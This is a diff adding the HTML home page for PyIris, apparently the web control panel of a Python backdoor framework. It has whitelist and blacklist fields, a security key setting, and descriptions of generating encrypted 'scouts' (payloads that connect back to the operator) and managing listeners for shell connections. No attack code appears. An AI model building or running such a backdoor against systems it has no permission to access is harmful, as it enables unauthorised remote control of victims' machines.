@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<script src="static/assets/js/jquery.min.js"></script>
+		<link rel="stylesheet" href="static/assets/css/style.css">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+		<script src="static/assets/js/home.js"></script>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=0.8, minimal-ui">
+		<meta name="description" content="PyIris - Home">
+		<meta name="author" content="Angus Yim">
+		<meta name="theme-color" content="#ffffff" />
+		<title>PyIris - Home</title>
+	</head>
+	<body>
+		<nav>
+			<a href="home">Home</a>
+			<a href="generator" style="color: #13a10e" id="gen_link">Generator</a>
+			<a href="listeners" style="color: #3b79ff">Listeners</a>
+			<a href="scouts" style="color: #e74856">Scouts</a>
+		</nav>
+		<div class="container">
+			<div class="row">
+				<div class="col-12">
+					<div id="error" class="hide"></div>
+
+					<h1 class="label" id="h1_home_heading">Home</h1>
+
+					<table id="table_whitelist">
+						<tr>
+							<th>Whitelist</th>
+							<th></th>
+						</tr>
+						<tr>
+							<td>
+								<input type="text" id="input_whitelist" name="Whitelist" placeholder="Hostname" maxlength="100">
+								<button id="button_whitelist" class="select">Update</button>
+							</td>
+							<td class='td_remove_whitelist' id='td_remove_whitelist_main'><button class='red'>X</button></td>
+						</tr>
+					</table>
+					<table id="table_blacklist">
+						<tr>
+							<th>Blacklist</th>
+							<th></th>
+						</tr>
+						<tr>
+							<td>
+								<input type="text" id="input_blacklist" name="Blacklist" placeholder="Hostname" maxlength="100">
+								<button id="button_blacklist" class="select">Update</button>
+							</td>
+							<td class='td_remove_blacklist' id='td_remove_blacklist_main'><button class='red'>X</button></td>
+						</tr>
+					</table>
+
+					<br>
+
+					<table id="table_key">
+						<tr>
+							<th>Security key</th>
+						</tr>
+						<tr>
+							<td>
+								<input type="password" id="input_key" name="key_input" placeholder="Key (Press Random for randomised 50 character key)" maxlength="50">
+								<button id="button_key_random" class="select">Random</button>
+								<button id="button_key_set" class="select">Set</button>
+							</td>
+						</tr>
+					</table>
+
+					<br>
+
+					<a href="generator" style="text-decoration: none;">
+						<h2 class="label" id="h2_generator_label">Generator</h2>
+					</a>
+					<p>
+						Generator Interface allows you to dynamically add and remove functionality to the deployable scout.<br>
+						Scout can be compiled for functionality on all systems.<br>
+						Supports source code encryption.<br>
+					</p>
+					<a href="listeners" style="text-decoration: none;">
+						<h2 class="label" id="h2_listeners_label">Listeners</h2>
+					</a>
+					<p>
+						Listeners allow you to manage network interfaces which are the actual programs handling and allowing connection to PyIris<br>
+						They can connect out to bind TCP Shell scouts<br><br>
+					</p>
+					<a href="scouts" style="text-decoration: none;">
+						<h2 class="label" id="h2_scouts_label">Scouts</h2>
+					</a>
+					<p>
+						Scouts interface lets you manage and interact with scouts (the payloads which connect back to you)<br>
+						Constantly expanding functionality to allow scouts to do so much more<br>
+						Connecting and using scouts requires unique security key to match (the one above)<br>
+					</p>
+					
+					<div id="copyright">
+						<a href="https://github.com/angus-y/PyIris-backdoor">GitHub</a><br>
+						Version 1.0.1<br>
+						Copyright © 2020 Angus Yim<br>
+						<a href="https://github.com/angus-y" target="_blank">https://github.com/angus-y</a>
+					</div>
+				</div>
+			</div>
+		</div>
+	</body>
+</html>
